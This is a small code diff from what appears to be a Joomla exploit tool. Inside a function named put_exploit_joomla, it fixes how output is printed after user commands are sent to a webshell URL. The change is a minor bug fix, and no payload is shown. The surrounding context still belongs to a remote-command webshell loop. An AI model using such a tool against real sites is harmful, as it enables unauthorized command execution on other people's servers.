@@ -101,9 +101,7 @@ def put_exploit_joomla(url):
             new_url = f"{host}{user_cmd}"
             response = requests.get(new_url)
 
-            if response.content.decode('utf-8') is None:
-                pass
-            else:
+            if response.content.decode('utf-8').strip():
                 print(response.content.decode('utf-8').rstrip())
     else:
         print("[!] Can't open a webshell")
